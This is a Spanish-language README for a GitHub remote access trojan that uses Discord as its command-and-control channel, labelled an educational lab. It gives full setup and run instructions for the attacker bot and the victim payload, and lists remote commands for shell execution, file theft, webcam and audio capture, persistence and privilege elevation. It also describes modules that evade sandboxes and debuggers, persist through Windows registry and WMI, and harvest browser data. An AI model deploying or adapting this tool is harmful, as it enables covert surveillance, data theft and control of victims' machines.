# 🎓 RAT-C2 — Laboratorio Educativo de Ciberseguridad

> **⚠️ AVISO LEGAL:** Este proyecto es exclusivamente educativo. Solo debe
> usarse en entornos controlados de laboratorio con autorización explícita.
> El uso no autorizado es ilegal. Ver [DISCLAIMER.md](DISCLAIMER.md).

---

## 📌 ¿Qué es este proyecto?

Un laboratorio educativo que demuestra cómo funciona un **RAT** (Remote Access
Trojan) y su infraestructura **C2** (Command and Control) usando **Discord**
como canal de comunicación entre el atacante y la víctima.

### Arquitectura

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   VÍCTIMA       │         │   DISCORD (C2)    │         │   ATACANTE      │
│                 │  envía  │                  │  recibe │                 │
│  victim/        │────────▶│  Canal #general  │◀────────│  attacker/      │
│  client.py      │         │                  │         │  bot.py         │
│                 │◀────────│                  │────────▶│                 │
│  5 módulos      │ recibe  │                  │  envía  │  Panel de       │
│                 │ comandos│                  │ comandos│  control        │
└─────────────────┘         └──────────────────┘         └─────────────────┘
```

**Flujo:**
1. El **atacante** ejecuta `bot.py` → se conecta a Discord
2. La **víctima** ejecuta `client.py` → se conecta al mismo canal
3. La víctima envía su info del sistema al canal
4. El atacante escribe comandos (`!shell`, `!screenshot`, etc.)
5. La víctima ejecuta los comandos y responde en Discord

---

## 📁 Estructura del proyecto

```
rat-educational-lab/
├── attacker/                  # 🤖 Centro de comando (atacante)
│   ├── bot.py                 #    Bot de Discord C2
│   ├── .env                   #    Token y configuración (NO subir a git)
│   ├── commands.py            #    Comandos del panel
│   ├── config.py              #    Configuración
│   ├── requirements.txt       #    Dependencias
│   └── README.md
│
├── victim/                    # 💻 Payload de la víctima
│   ├── client.py              #    Script principal de la víctima
│   ├── modules/
│   │   ├── environment.py     #    Detección de sandbox/VM/debugger
│   │   ├── persistence.py     #    Técnicas de persistencia
│   │   ├── intelligence.py    #    Recopilación de información
│   │   ├── discord_c2.py      #    Cliente C2 vía Discord
│   │   └── commands.py        #    Ejecutor de comandos remotos
│   ├── requirements.txt       #    Dependencias
│   └── README.md
│
├── test_connection.py         # 🔍 Test de conexión del bot
├── docs/                      # 📚 Documentación educativa
├── DISCLAIMER.md              # ⚠️ Aviso legal
├── LICENSE.md                 # 📄 Licencia
└── README.md                  # 📖 Este archivo
```

---

## 🛠️ Configuración del Bot en Discord

### Paso 1: Crear la aplicación

1. Ve a **https://discord.com/developers/applications**
2. Haz clic en **"New Application"** → ponle un nombre → **"Create"**

### Paso 2: Crear el bot

1. En el menú lateral, ve a **"Bot"**
2. Haz clic en **"Add Bot"** → **"Yes, do it!"**
3. ⚠️ **ACTIVA estos 3 Intents** (obligatorio):

   | Intent | Estado |
   |--------|--------|
   | PRESENCE INTENT | ✅ ON |
   | SERVER MEMBERS INTENT | ✅ ON |
   | MESSAGE CONTENT INTENT | ✅ ON |

4. Haz clic en **"Reset Token"** y **copia el token** (empieza con `MTU...`)
   - ⚠️ Se muestra solo una vez. Guárdalo bien.

### Paso 3: Invitar el bot al servidor

1. Ve a **"OAuth2"** → **"URL Generator"**
2. En **Scopes** marca: `bot` y `applications.commands`
3. En **Bot Permissions** marca: `Administrator`
4. Copia la **URL** generada al fondo de la página
5. Ábrela en tu navegador → selecciona tu servidor → **"Autorizar"**

### Paso 4: Obtener el Channel ID

1. En Discord, ve a **Configuración de Usuario** (⚙️) → **Avanzado**
2. Activa **"Modo Desarrollador"**
3. **Clic derecho** en el canal de texto (ej: `#general`)
4. **"Copiar ID del Canal"**
5. ⚠️ Este ID es diferente al ID del servidor. Ejemplo:
   - Servidor ID: `1559156938573357109`
   - Canal ID:    `1559156939974250559` ← Este es el que necesitas

---

## 🚀 Instalación

### Requisitos

- Python 3.10+
- Una cuenta de Discord
- Un servidor de Discord propio

### Pasos

```bash
# 1. Clonar el repositorio
git clone https://github.com/HubertUi/RAT-c2.git
cd RAT-c2

# 2. Crear entorno virtual
python3 -m venv venv

# 3. Activar entorno virtual
source venv/bin/activate        # Linux/macOS
venv\Scripts\activate           # Windows

# 4. Instalar dependencias
pip install -r attacker/requirements.txt
pip install -r victim/requirements.txt
```

---

## ⚙️ Configuración

Crea el archivo `attacker/.env`:

```env
DISCORD_BOT_TOKEN=tu_token_aqui
COMMAND_CHANNEL_ID=tu_channel_id_aqui
```

| Variable | Descripción |
|----------|-------------|
| `DISCORD_BOT_TOKEN` | Token del bot (Paso 2) |
| `COMMAND_CHANNEL_ID` | ID del canal de texto (Paso 4) |

> ⚠️ El archivo `.env` está en `.gitignore` — **NUNCA** lo subas a GitHub.

---

## ▶️ Ejecución

### 1. Probar la conexión

```bash
source venv/bin/activate
python test_connection.py
```

Verás algo como:

```
==================================================
TEST DE CONEXIÓN - BOT C2 DISCORD
==================================================

[1] Token cargado: MTU1ODk3NzIxMjA5NzQ5NTE5M...
[2] Channel ID: 1559156939974250559

[0] Conectando a Discord...

[3] ✅ Bot conectado como: RAT-C2#0196
[4] ✅ ID del bot: 1558977212097495191
[5] ✅ Servidores conectados: 1
    - RAT - C2 lab (ID: 1559156938573357109)

[6] ✅ Canal encontrado: #general
[7] ✅ Tipo de canal: text
[8] ✅ Mensaje enviado al canal #general

✅ TODOS LOS TESTS PASARON CORRECTAMENTE
```

Si todo funciona, verás un **embed verde** en Discord: *"🟢 TEST EXITOSO"*.

### 2. Iniciar el bot atacante

```bash
source venv/bin/activate
python -u attacker/bot.py
```

Salida esperada:

```
[+] Bot conectado como: RAT-C2#0196
[+] Canal de comandos: 1559156939974250559
```

En Discord aparecerá: *"C2 Server Iniciado — Esperando conexiones..."*

### 3. Ejecutar el payload de la víctima

En **otra terminal** (o en otra máquina):

```bash
source venv/bin/activate
python victim/client.py --token TU_TOKEN --channel TU_CHANNEL_ID
```

> Para testing en sandbox, agrega `--allow-sandbox`

La víctima se conectará y enviará un embed con:
- Sistema Operativo
- Usuario
- IP Pública
- RAM

---

## 🎮 Comandos disponibles

Los comandos se escriben en el canal de Discord con prefijo `!`:

### 📁 Navegación

| Comando | Descripción |
|---------|-------------|
| `!ls [ruta]` | Listar archivos del directorio |
| `!cd <ruta>` | Cambiar directorio |
| `!pwd` | Mostrar directorio actual |
| `!cat <archivo>` | Ver contenido de un archivo |

### 📥 Transferencia

| Comando | Descripción |
|---------|-------------|
| `!download <ruta>` | Descargar archivo de la víctima |
| `!upload` (con adjunto) | Subir archivo a la víctima |

### 📸 Captura

| Comando | Descripción |
|---------|-------------|
| `!screenshot` | Captura de pantalla |
| `!webcam` | Foto de webcam |
| `!record <segundos>` | Grabar audio |

### ⚙️ Sistema

| Comando | Descripción |
|---------|-------------|
| `!shell <comando>` | Ejecutar comando en la terminal |
| `!processes` | Listar procesos activos |
| `!kill <pid>` | Terminar un proceso |
| `!info` | Información completa del sistema |

### 🔧 Persistencia

| Comando | Descripción |
|---------|-------------|
| `!persist` | Establecer persistencia en el sistema |
| `!elevate` | Intentar elevación de privilegios |

### 🔄 Control

| Comando | Descripción |
|---------|-------------|
| `!shutdown` | Apagar el sistema |
| `!reboot` | Reiniciar el sistema |
| `!exit` | Cerrar sesión del RAT |
| `!help` | Mostrar todos los comandos |

### 🤖 Comandos del bot atacante

| Comando | Descripción |
|---------|-------------|
| `!sessions` | Listar sesiones activas |
| `!broadcast <msg>` | Enviar mensaje a todas las sesiones |
| `!cleanup` | Limpiar sesiones inactivas |

---

## 🧩 Módulos de la víctima

### 1. `environment.py` — Verificación de entorno
- Detección de sandbox (VirtualBox, VMware, QEMU)
- Detección de debugger
- Verificación de análisis dinámico
- Si detecta entorno de análisis → sale automáticamente

### 2. `persistence.py` — Persistencia
- Claves de registro de Windows
- Carpeta de inicio
- Tareas programadas
- WMI (Windows Management Instrumentation)

### 3. `intelligence.py` — Recopilación de información
- Sistema operativo y hardware
- Red (IP pública, interfaces)
- Usuario actual y privilegios
- Software instalado
- Datos de navegadores

### 4. `discord_c2.py` — Comunicación C2
- Conexión a Discord como cliente
- Registro de sesión en el canal
- Cola de comandos asíncrona
- Envío de archivos, capturas y mensajes

### 5. `commands.py` — Ejecutor de comandos
- Ejecución de comandos shell
- Captura de pantalla
- Transferencia de archivos
- Gestión de procesos
- Persistencia remota

---

## 🔍 Flujo completo de ejecución

```
1. atacante ejecuta bot.py
   └─▶ Bot se conecta a Discord
   └─▶ Envía "C2 Server Iniciado" al canal

2. víctima ejecuta client.py
   └─▶ Fase 1: Verifica entorno (sandbox/debugger)
   └─▶ Fase 2: Establece persistencia
   └─▶ Fase 3: Recopila información del sistema
   └─▶ Fase 4: Se conecta a Discord
   └─▶ Fase 5: Envía info al canal y entra en modo escucha

3. atacante escribe comandos en Discord
   └─▶ !shell whoami
   └─▶ !screenshot
   └─▶ !download C:\Users\victim\file.txt

4. víctima ejecuta los comandos
   └─▶ Responde con resultados en Discord
```

---

## ❗ Solución de problemas

| Error | Causa | Solución |
|-------|-------|----------|
| `No module named 'discord'` | Dependencias no instaladas | `pip install -r requirements.txt` |
| `401 Unauthorized` | Token inválido | Regenera el token en Developer Portal |
| `Missing Access` | Bot no está en el servidor | Invita el bot con OAuth2 |
| `Intent no habilitado` | Faltan intents | Activa los 3 intents en Paso 2 |
| `Canal no encontrado` | ID incorrecto | Verifica que es el ID del canal, no del servidor |
| `Permission denied` | Sin permisos | Re-invita con permiso `Administrator` |

---

## 📚 Documentación adicional

- [DISCLAIMER.md](DISCLAIMER.md) — Aviso legal completo
- [docs/analisis_tecnicas.md](docs/analisis_tecnicas.md) — Análisis de técnicas
- [docs/contramedidas.md](docs/contramedidas.md) — Guías de detección

---

## 📄 Licencia

Este proyecto está bajo licencia educativa. Ver [LICENSE.md](LICENSE.md).

---

**Proyecto educativo de ciberseguridad — Solo para laboratorio controlado.**
